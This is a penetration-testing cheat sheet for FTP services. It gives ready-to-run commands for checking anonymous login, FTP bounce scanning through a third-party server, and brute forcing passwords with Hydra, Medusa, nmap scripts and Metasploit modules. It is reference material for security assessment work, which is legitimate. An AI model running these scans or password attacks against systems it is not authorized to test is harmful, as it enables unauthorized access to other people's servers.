---
author(s):
  - Userware
tags:
  - vulnerability-assessment
  - initial-access
  - password-cracking
  - network-ports
  - ftp
  - nuclei
  - hydra
  - medusa
  - network-mapper
  - metasploit-framework
---
# FTP

## 01 - Anonymous Login

### 1.1 - Manual

Pass these credentials username: `anonymous` and password: `anonymous`

```
$ ftp <IP>
```

### 1.2 - Nuclei

```
$ nuclei -l ip_targets.txt -t ~/nuclei-templates -id ftp-anonymous-login
```

### 1.3 - Network Mapper

```
$ nmap -p 21 -Pn -n --script ftp-anon <IP>

$ nmap -p 21 -Pn -n --script ftp-anon -iL ip_targets.txt
```

### 1.4 - Metasploit

```
msf > use auxiliary/scanner/ftp/anonymous

msf auxiliary(scanner/ftp/anonymous) > options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/ftp/anonymous) > set rhosts <IP>

msf auxiliary(scanner/ftp/anonymous) > set threads 4

msf auxiliary(scanner/ftp/anonymous) > run -j
```

## 02 -  FTP Bounce

### 2.1 - Network Mapper

Using a FTP server as a proxy server to scan the target

```
$ nmap -b <username>:<password>@<FTP_server_IP> <target_IP>

$ nmap -v -p 21,22,80,443,445 -Pn -b <username>:<password>@<FTP_server_IP> <target_IP>/<CIDR>
```

### 2.2 - Metasploit

```
msf > use auxiliary/scanner/portscan/ftpbounce

msf auxiliary(scanner/portscan/ftpbounce) > options

msf auxiliary(scanner/portscan/ftpbounce) > run rhosts=<IP>
```

## 03 - Brute Force

### 3.1 - Hydra

```
$ hydra -V -l <username> -P passwords.lst ftp://<target_IP>
```

### 3.2 - Medusa

```
$ medusa -h <target_IP> -u <username> -P passwords.lst -M ftp
```

### 3.3 - Network Mapper

```
$ nmap -p 21 -Pn --script ftp-brute --script-args userdb=users.lst,passdb=passwords.lst <IP>
```

### 3.4 - Metasploit

```
msf > use auxiliary/scanner/ftp/ftp_login

msf auxiliary(scanner/ftp/ftp_login) > options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false            no        Record anonymous/guest logins to the database
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             21               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/ftp/ftp_login) > set username <username>

msf auxiliary(scanner/ftp/ftp_login) > set pass_file /path/to/passwords.lst

msf auxiliary(scanner/ftp/ftp_login) > set rhosts <target_IP>

msf auxiliary(scanner/ftp/ftp_login) > run -j
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Ports/Cross Platform/File Server/FTP]]

### Hacktricks

- [Hacktricks: Pentesting FTP Bounce Attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.html)

- [Hacktricks: Pentesting FTP Download 2OFTP File](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file.html)

### Hacking Articles

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)

### Penetration Testing Tools

- [Penetration Testing Tools: Medusa](https://en.kali.tools/?p=200)